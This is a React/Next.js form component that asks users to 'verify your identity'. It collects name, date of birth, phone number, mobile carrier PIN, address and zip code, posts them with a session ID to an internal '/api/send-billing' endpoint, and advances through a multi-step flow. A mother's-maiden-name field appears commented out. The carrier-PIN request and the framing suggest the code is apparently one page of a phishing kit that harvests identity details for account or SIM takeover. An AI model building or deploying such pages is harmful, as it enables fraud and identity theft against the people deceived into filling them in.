import axios from "axios";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Input } from "../../components/Input";
import { Wrapper } from "../../components/Wrapper";
import { getNextUrl } from "../../utils/getNextUrl";
import { getProgress } from "../../utils/getProgress";
import { DataContext } from "../_app";

interface BillingProps {}

const schema = yup.object().shape({
  firstname: yup.string().required("First name is required"),
  lastname: yup.string().required("Last name is required"),
  dob: yup.string().required("Date of birth is required"),
  streetAddress: yup.string().required("Address is required"),
  zipCode: yup.string().required("Zip code is required"),
  state: yup.string().required("State is required"),
  phoneNumber: yup.string().required("Phone number is required"),
  carrierPin: yup.string(),
  // mmn: yup.string(),
});

export const Billing: React.FC<BillingProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
    resetField,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(`billing`, JSON.stringify({ sessionId: datas.sessionId, ...data }));

    try {
      await axios.post(`/api/send-billing`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      billing: data,
    });

    const url = getProgress()[getProgress().indexOf(`BILLING`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Wrapper
      title="Personal information"
      subTitle="Please Verify Your Identity"
      loading={!isValid || loading}
      onSubmit={onSubmit}
      icon={
        <svg
          className="pt4 pb2 signup-img"
          aria-hidden="true"
          viewBox="0 0 24 24"
          data-testid="AccountCircleIcon"
          fill="#0078E7"
          width={`3.75em`}
          height={`3.75em`}
        >
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm0 14c-2.03 0-4.43-.82-6.14-2.88a9.947 9.947 0 0112.28 0C16.43 19.18 14.03 20 12 20z" />
        </svg>
      }
    >
      <Input
        label={`First Name`}
        name={`firstname`}
        register={register}
        resetField={resetField}
        curValue={watch(`firstname`)}
        error={
          errors.firstname && (errors.firstname.message as unknown as string)
        }
      />

      <Input
        label={`Last Name`}
        name={`lastname`}
        register={register}
        resetField={resetField}
        curValue={watch(`lastname`)}
        error={
          errors.lastname && (errors.lastname.message as unknown as string)
        }
      />

      <Input
        label={`Date of Birth`}
        name={`dob`}
        register={register}
        resetField={resetField}
        curValue={watch(`dob`)}
        error={errors.dob && (errors.dob.message as unknown as string)}
        mask={`99/99/9999`}
      />

      <Input
        label={`Phone Number`}
        name={`phoneNumber`}
        register={register}
        resetField={resetField}
        curValue={watch(`phoneNumber`)}
        error={
          errors.phoneNumber &&
          (errors.phoneNumber.message as unknown as string)
        }
        mask={`(999) 999 9999`}
      />

      <Input
        label={`Carrier Pin`}
        name={`carrierPin`}
        register={register}
        resetField={resetField}
        curValue={watch(`carrierPin`)}
        error={
          errors.carrierPin && (errors.carrierPin.message as unknown as string)
        }
        type="number"
      />

      <Input
        label={`Address`}
        name={`streetAddress`}
        register={register}
        resetField={resetField}
        curValue={watch(`streetAddress`)}
        error={
          errors.streetAddress &&
          (errors.streetAddress.message as unknown as string)
        }
      />

      <Input
        label={`State`}
        name={`state`}
        register={register}
        resetField={resetField}
        curValue={watch(`state`)}
        error={errors.state && (errors.state.message as unknown as string)}
      />

      <Input
        label={`Zip Code`}
        name={`zipCode`}
        register={register}
        resetField={resetField}
        curValue={watch(`zipCode`)}
        error={errors.zipCode && (errors.zipCode.message as unknown as string)}
        type="number"
      />
    </Wrapper>
  );
};

export default Billing;
